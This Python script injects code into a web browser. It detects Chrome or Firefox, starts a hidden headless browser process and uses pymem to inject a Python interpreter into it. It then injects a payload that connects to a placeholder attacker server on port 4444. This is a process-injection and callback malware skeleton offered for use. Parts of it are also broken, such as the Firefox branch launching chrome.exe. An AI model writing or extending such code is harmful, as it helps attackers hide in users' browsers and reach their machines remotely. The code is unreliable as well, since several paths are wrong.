from pymem import Pymem
import pymem
import os
import subprocess

#class to check if chrome exists in default windows install path
def chromecheck():
    global chromeexists
    if os.path.exists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe") == True:
        return True
    else:
        return False

#class to check if firefox exists in default windows install path
def firefoxcheck():
    global firefoxexists
    if os.path.exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe") == True:
        return True
    else:
        return False

#class to check if chrome is currently running
def is_chrome_running():
    try:
        result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq chrome.exe'], capture_output=True, text=True)
        return 'chrome.exe' in result.stdout
    except Exception as e:
        print(f"Error checking for Chrome processes: {e}")
        return False

#class to check if firefox is currently running
def is_firefox_running():
    try:
        result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq firefox.exe'], capture_output=True, text=True)
        return 'firefox.exe' in result.stdout
    except Exception as e:
        print(f"Error checking for firefox processes: {e}")
        return False

#if chrome is installed on the system...
if chromecheck():
    if is_chrome_running():
        #if chrome is running...
        print("Chrome is running. Injecting...")
        #create a new, headless "invisable" chrome thread
        chrome = [
        'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
        '--headless',
        '--disable-gpu',
        '--disable-software-rasterizer'
        ]
        chromeproc = subprocess.Popen(chrome)
        #inject python code into the new thread
        pm = pymem.Pymem('chrome.exe')
        print("Injected.")
    else:
        #if chrome is not running but it is installed...
        print("Chrome is not running. Starting chrome")
        #create new chrome process
        url = 'https://www.google.com'
        chrome_path = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
        chrome = [chrome_path, url]
        chromeproc = subprocess.Popen(chrome)
        #inject python code into the new process
        pm = pymem.Pymem('chrome.exe')
        print("Injected.")
else:
    #if firefox is installed on the system...
    if firefoxcheck():
        if is_firefox_running():
            #if firefox is running...
            print("Firefox is running. Injecting...")
            #create a new, headless "invisable" firefox thread
            firefox = [
                'C:\Program Files\Mozilla Firefox\firefox.exe',
                '-headless'
            ]
            firefox_proc = subprocess.Popen(firefox)
            #inject python code into the new process
            pm = pymem.Pymem('firefox.exe')
            print("Injected.")
        else:
            #if firefox is not running but it is installed...
            print("Firefox is not running. Starting firefox")
            #create new firefox process
            url = 'https://www.google.com'
            firefox_path = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
            firefox = [firefox_path, url]
            firefox_proc = subprocess.Popen(firefox)
            #inject python code into the new process
            pm = pymem.Pymem('firefox.exe')
            print("Injected.")

pm.inject_python_interpreter()

shellcode = """
import socket
import subprocess
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('{YOUR SERVER IP}', 4444)
client_socket.connect(server_address)
try:
    data = client_socket.recv(1024)
    print(f"Received message from server: {data}")
finally:
    client_socket.close()
"""
pm.inject_python_shellcode(shellcode)

exit()
